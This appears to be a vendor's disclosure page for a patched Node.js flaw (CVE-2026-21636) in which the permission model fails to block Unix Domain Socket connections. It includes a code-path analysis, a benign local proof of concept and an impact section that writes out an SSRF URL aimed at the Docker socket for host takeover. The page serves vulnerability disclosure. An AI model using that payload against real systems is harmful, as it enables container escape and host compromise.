---
schema_version: "1.0.0"
document_id: "4f57d459695d97ab17044647f698da517948011289fabb282b456de1f4d8956a"
company_key: "yc-winfunc"
company: "winfunc"
source_id: "yc-winfunc-rss-7ebe4d6da681"
canonical_url: "https://winfunc.com/hacktivity/CVE-2026-21636"
published_at: "2025-01-01T00:00:00+00:00"
first_seen_at: "2026-07-20T23:21:05.938183+00:00"
fetched_at: "2026-07-28T20:58:25.712310+00:00"
content_hash: "sha256:18ca13262da90f0a84b2ff067ef79476471f7f6604285cc65488b46ccbd72ddd"
---

# Permission model bypass via unchecked Unix Domain Socket connections (CVE-2026-21636)

[Back to Hacktivity](https://winfunc.com/hacktivity)


### Status: Patched


This vulnerability has been verified as resolved and deployed.


Node.js


Medium


CVE-2026-21636


2025


# Permission model bypass via unchecked Unix Domain Socket connections (CVE-2026-21636)


## Summary


Node.js permission model fails to enforce network restrictions for Unix Domain Socket connections


Node.js permission model **fails to enforce network restrictions for Unix Domain Socket (UDS) connections** . With` --permission` enabled and **without**` --allow-net` (or any allowlists), an attacker-controlled URL or` socketPath` still reaches arbitrary local sockets via` net` ,` tls` , or` undici` /` fetch` . This breaks the security boundary the permission model is meant to provide and enables SSRF-to-local-RCE style impact against local daemons (e.g., Docker API) while the administrator believes networking is blocked.


### CVSS Score


Vector


L


Complexity


L


Privileges


N


User Interaction


N


Scope


U


Confidentiality


H


Integrity


H


Availability


L


CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:L


### Vulnerability Location


Source


Line 51


deps /undici


/src


/lib


/core


/connect.js


options = { path: socketPath }


Sink


Line 216


src /pipe_wrap.cc


PipeWrap::Connect


## Source-to-Sink Analysis


1


src/pipe_wrap.cc:228-236


` PipeWrap::Connect` calls` uv_pipe_connect2` directly without any permission enforcement. Unlike TCP connections which explicitly check permissions, UDS connections bypass this entirely.


CPP


```text
ConnectWrap* req_wrap =
new    ConnectWrap  (env, req_wrap_obj, AsyncWrap::PROVIDER_PIPECONNECTWRAP);
int   err = req_wrap-> Dispatch  (uv_pipe_connect2,
&wrap->handle_,
*name,
name. length  (),
UV_PIPE_NO_TRUNCATE,
AfterConnect);


```


2


src/tcp_wrap.cc:272


For comparison, TCP connect enforces permissions using` ERR_ACCESS_DENIED_IF_INSUFFICIENT_PERMISSIONS` . This check is **absent** from the UDS path in` pipe_wrap.cc` .


CPP


```text
ERR_ACCESS_DENIED_IF_INSUFFICIENT_PERMISSIONS  (
env, permission::PermissionScope::kNet, ip_address. ToStringView  (), args);


```


3


deps/undici/src/lib/core/connect.js:51,90-96


Undici connector builds` net.connect` with the attacker-controlled` socketPath` , which uses` PipeWrap` internally and bypasses permission checks.


JAVASCRIPT


```text
const   options = {  path  : socketPath, ...opts }
// ...
socket = net. connect  ({
highWaterMark  :  64   *  1024  ,
...options,
localAddress,
port,
host  : hostname
})


```


4


lib/internal/process/pre_execution.js


Permission model initialization sets up` process.permission` , but` pipe_wrap` IPC paths never call` ERR_ACCESS_DENIED_IF_INSUFFICIENT_PERMISSIONS` , so the model is bypassed for all UDS operations.


JAVASCRIPT


```text
// Permission model sets up kNet scope checks,
// but PipeWrap never queries them


```


## Impact Analysis


### Critical Impact


SSRF in a web app running with` --permission` lets an attacker supply` http://unix:/var/run/docker.sock:/containers/json` to gain Docker control, spawn containers with host mounts, and achieve host RCE. Access to local secrets daemons (Vault agent sockets, database UDS listeners) is also possible without any` --allow-net` flag. The primary security guarantee of` --permission` is bypassed for UDS, invalidating the threat model for "no network" deployments.


### Attack Surface


Any Node.js application running with` --permission` enabled that accepts attacker-controlled URLs or socket paths via` net.connect` ,` tls.connect` , or` undici` /` fetch` with` socketPath` options.


### Preconditions


The attacker needs the ability to supply a URL (e.g., SSRF) or` socketPath` option to a Node.js process running with the permission model enabled. No` --allow-net` flag is required for the attack to succeed.


## Proof of Concept


### Environment Setup


Requirements: Build Node.js from source (` ./configure && make -j8` ) or use Node.js v25+ with the permission model.


Verify build:


BASH


```text
./node --version
# v26.0.0-pre (or v25.x)


```


### Target Configuration


**Terminal 1: Start a UDS listener (benign stand-in for a privileged daemon)**


BASH


```text
./node -e  "const net=require('net'); net.createServer(s=>{s.end('pong')}).listen('/tmp/perm.sock');"


```


### Exploit Delivery


**Terminal 2: Connect with permission model enabled but no --allow-net**


**Minimal Repro (net.connect to UDS):**


BASH


```text
./node --permission -e  "const net=require('net'); const s=net.connect({path:'/tmp/perm.sock'},()=>{console.log('CONNECTED'); s.end();}); s.on('error',e=>console.error('ERR',e));"


```


**Minimal Repro (undici/fetch over UDS):**


BASH


```text
./node --permission -e  "const { request } = require('undici'); request('http://unix:/tmp/perm.sock:/').then(r=>r.body.text()).then(console.log).catch(console.error);"


```


### Outcome


Both repros demonstrate that UDS connections bypass the permission model entirely. The` net.connect` example prints` CONNECTED` and the undici example successfully receives the response from the socket. This allows attackers to pivot through Node's runtime to access privileged local services (Docker API, database sockets, etc.) despite the operator enabling the permission model.


**Expected Response:**


TEXT


```text
CONNECTED


```


The connection succeeds even though` --allow-net` was not provided. This should result in` ERR_ACCESS_DENIED` .


## Run this level of analysis on your repo.


Winfunc traces source-to-sink paths, validates exploitability, and gives your team patch-ready remediation.


[Vulnerability Detection](https://winfunc.com/products/scanner/vulnerability-detection)


[View Patch PR Verify fix on GitHub](https://github.com/nodejs/node/commit/1d2686d15e788218be35e1cb26dfbb551d8366e3)
